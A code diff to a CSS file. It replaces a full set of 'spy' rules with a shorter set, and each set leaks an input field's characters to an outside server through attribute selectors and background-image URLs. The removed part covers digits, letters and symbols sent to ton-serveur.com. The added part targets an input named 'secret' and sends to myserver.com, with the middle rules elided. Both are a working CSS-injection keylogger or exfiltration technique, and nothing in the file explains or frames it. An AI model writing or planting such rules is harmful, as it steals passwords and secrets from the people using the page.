@@ -1,100 +1,17 @@
-  /* --- Chiffres --- */
-#spy[value$="0"] { background-image: url("https://ton-serveur.com/?q=0"); }
-#spy[value$="1"] { background-image: url("https://ton-serveur.com/?q=1"); }
-#spy[value$="2"] { background-image: url("https://ton-serveur.com/?q=2"); }
-#spy[value$="3"] { background-image: url("https://ton-serveur.com/?q=3"); }
-#spy[value$="4"] { background-image: url("https://ton-serveur.com/?q=4"); }
-#spy[value$="5"] { background-image: url("https://ton-serveur.com/?q=5"); }
-#spy[value$="6"] { background-image: url("https://ton-serveur.com/?q=6"); }
-#spy[value$="7"] { background-image: url("https://ton-serveur.com/?q=7"); }
-#spy[value$="8"] { background-image: url("https://ton-serveur.com/?q=8"); }
-#spy[value$="9"] { background-image: url("https://ton-serveur.com/?q=9"); }
+input[name="secret"][value^="a"] {
+  background: url(https://myserver.com?q=a)
+}
 
-/* --- Lettres (a à z) --- */
-#spy[value$="a"] { background-image: url("https://ton-serveur.com/?q=a"); }
-#spy[value$="b"] { background-image: url("https://ton-serveur.com/?q=b"); }
-#spy[value$="c"] { background-image: url("https://ton-serveur.com/?q=c"); }
-#spy[value$="d"] { background-image: url("https://ton-serveur.com/?q=d"); }
-#spy[value$="e"] { background-image: url("https://ton-serveur.com/?q=e"); }
-#spy[value$="f"] { background-image: url("https://ton-serveur.com/?q=f"); }
-#spy[value$="g"] { background-image: url("https://ton-serveur.com/?q=g"); }
-#spy[value$="h"] { background-image: url("https://ton-serveur.com/?q=h"); }
-#spy[value$="i"] { background-image: url("https://ton-serveur.com/?q=i"); }
-#spy[value$="j"] { background-image: url("https://ton-serveur.com/?q=j"); }
-#spy[value$="k"] { background-image: url("https://ton-serveur.com/?q=k"); }
-#spy[value$="l"] { background-image: url("https://ton-serveur.com/?q=l"); }
-#spy[value$="m"] { background-image: url("https://ton-serveur.com/?q=m"); }
-#spy[value$="n"] { background-image: url("https://ton-serveur.com/?q=n"); }
-#spy[value$="o"] { background-image: url("https://ton-serveur.com/?q=o"); }
-#spy[value$="p"] { background-image: url("https://ton-serveur.com/?q=p"); }
-#spy[value$="q"] { background-image: url("https://ton-serveur.com/?q=q"); }
-#spy[value$="r"] { background-image: url("https://ton-serveur.com/?q=r"); }
-#spy[value$="s"] { background-image: url("https://ton-serveur.com/?q=s"); }
-#spy[value$="t"] { background-image: url("https://ton-serveur.com/?q=t"); }
-#spy[value$="u"] { background-image: url("https://ton-serveur.com/?q=u"); }
-#spy[value$="v"] { background-image: url("https://ton-serveur.com/?q=v"); }
-#spy[value$="w"] { background-image: url("https://ton-serveur.com/?q=w"); }
-#spy[value$="x"] { background-image: url("https://ton-serveur.com/?q=x"); }
-#spy[value$="y"] { background-image: url("https://ton-serveur.com/?q=y"); }
-#spy[value$="z"] { background-image: url("https://ton-serveur.com/?q=z"); }
+input[name="secret"][value^="b"] {
+  background: url(https://myserver.com?q=b)
+}
 
-/* --- Lettres majuscules (A à Z) --- */
-#spy[value$="A"] { background-image: url("https://ton-serveur.com/?q=A"); }
-#spy[value$="B"] { background-image: url("https://ton-serveur.com/?q=B"); }
-#spy[value$="C"] { background-image: url("https://ton-serveur.com/?q=C"); }
-#spy[value$="D"] { background-image: url("https://ton-serveur.com/?q=D"); }
-#spy[value$="E"] { background-image: url("https://ton-serveur.com/?q=E"); }
-#spy[value$="F"] { background-image: url("https://ton-serveur.com/?q=F"); }
-#spy[value$="G"] { background-image: url("https://ton-serveur.com/?q=G"); }
-#spy[value$="H"] { background-image: url("https://ton-serveur.com/?q=H"); }
-#spy[value$="I"] { background-image: url("https://ton-serveur.com/?q=I"); }
-#spy[value$="J"] { background-image: url("https://ton-serveur.com/?q=J"); }
-#spy[value$="K"] { background-image: url("https://ton-serveur.com/?q=K"); }
-#spy[value$="L"] { background-image: url("https://ton-serveur.com/?q=L"); }
-#spy[value$="M"] { background-image: url("https://ton-serveur.com/?q=M"); }
-#spy[value$="N"] { background-image: url("https://ton-serveur.com/?q=N"); }
-#spy[value$="O"] { background-image: url("https://ton-serveur.com/?q=O"); }
-#spy[value$="P"] { background-image: url("https://ton-serveur.com/?q=P"); }
-#spy[value$="Q"] { background-image: url("https://ton-serveur.com/?q=Q"); }
-#spy[value$="R"] { background-image: url("https://ton-serveur.com/?q=R"); }
-#spy[value$="S"] { background-image: url("https://ton-serveur.com/?q=S"); }
-#spy[value$="T"] { background-image: url("https://ton-serveur.com/?q=T"); }
-#spy[value$="U"] { background-image: url("https://ton-serveur.com/?q=U"); }
-#spy[value$="V"] { background-image: url("https://ton-serveur.com/?q=V"); }
-#spy[value$="W"] { background-image: url("https://ton-serveur.com/?q=W"); }
-#spy[value$="X"] { background-image: url("https://ton-serveur.com/?q=X"); }
-#spy[value$="Y"] { background-image: url("https://ton-serveur.com/?q=Y"); }
-#spy[value$="Z"] { background-image: url("https://ton-serveur.com/?q=Z"); }
+input[name="secret"][value^="c"] {
+  background: url(https://myserver.com?q=c)
+}
 
-/* --- Caractères spéciaux --- */
-#spy[value$="@"] { background-image: url("https://ton-serveur.com/?q=@"); }
-#spy[value$="."] { background-image: url("https://ton-serveur.com/?q=."); }
-#spy[value$=","] { background-image: url("https://ton-serveur.com/?q=,"); }
-#spy[value$=";"] { background-image: url("https://ton-serveur.com/?q=;"); }
-#spy[value$=":"] { background-image: url("https://ton-serveur.com/?q=:"); }
-#spy[value$="!"] { background-image: url("https://ton-serveur.com/?q=!"); }
-#spy[value$="?"] { background-image: url("https://ton-serveur.com/?q=?"); }
-#spy[value$="/"] { background-image: url("https://ton-serveur.com/?q=/"); }
-#spy[value$="\\"] { background-image: url("https://ton-serveur.com/?q=\\"); }
-#spy[value$="&"] { background-image: url("https://ton-serveur.com/?q=&"); }
-#spy[value$="*"] { background-image: url("https://ton-serveur.com/?q=*"); }
-#spy[value$="+"] { background-image: url("https://ton-serveur.com/?q=+"); }
-#spy[value$="-"] { background-image: url("https://ton-serveur.com/?q=-"); }
-#spy[value$="_"] { background-image: url("https://ton-serveur.com/?q=_"); }
-#spy[value$="="] { background-image: url("https://ton-serveur.com/?q=="); }
-#spy[value$="("] { background-image: url("https://ton-serveur.com/?q=("); }
-#spy[value$=")"] { background-image: url("https://ton-serveur.com/?q=)"); }
-#spy[value$="["] { background-image: url("https://ton-serveur.com/?q=["); }
-#spy[value$="]"] { background-image: url("https://ton-serveur.com/?q=]"); }
-#spy[value$="{"] { background-image: url("https://ton-serveur.com/?q={"); }
-#spy[value$="}"] { background-image: url("https://ton-serveur.com/?q=}"); }
-#spy[value$="<"] { background-image: url("https://ton-serveur.com/?q=<"); }
-#spy[value$=">"] { background-image: url("https://ton-serveur.com/?q=>"); }
-#spy[value$="|"] { background-image: url("https://ton-serveur.com/?q=|"); }
-#spy[value$="~"] { background-image: url("https://ton-serveur.com/?q=~"); }
-#spy[value$="`"] { background-image: url("https://ton-serveur.com/?q=`"); }
-#spy[value$="#"] { background-image: url("https://ton-serveur.com/?q=#"); }
-#spy[value$="$"] { background-image: url("https://ton-serveur.com/?q=$"); }
-#spy[value$="%"] { background-image: url("https://ton-serveur.com/?q=%"); }
-#spy[value$="^"] { background-image: url("https://ton-serveur.com/?q=^"); }
-#spy[value$=" "] { background-image: url("https://ton-serveur.com/?q=space"); }
+//....
+
+input[name="secret"][value^="z"] {
+  background: url(https://myserver.com?q=z)
+}
